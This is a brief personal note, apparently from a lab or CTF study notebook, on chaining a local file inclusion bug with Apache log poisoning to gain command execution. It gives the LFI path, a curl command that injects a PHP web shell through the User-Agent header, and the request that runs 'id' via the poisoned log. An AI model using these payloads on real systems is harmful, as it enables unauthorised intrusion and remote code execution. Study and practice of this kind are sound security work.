Able to read logs via LFI:

```bash
index.php?language=/var/log/apache2/access.log
```

Update User-Agent with the following, either using Burp or Curl:

```bash
User-Agent: <?php system($_GET['cmd']); ?>
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Visit logs again

```bash
/index.php?language=/var/log/apache2/access.log&cmd=id
```

Output can be seen in the log:

![[Pasted image 20250124134617.png]]


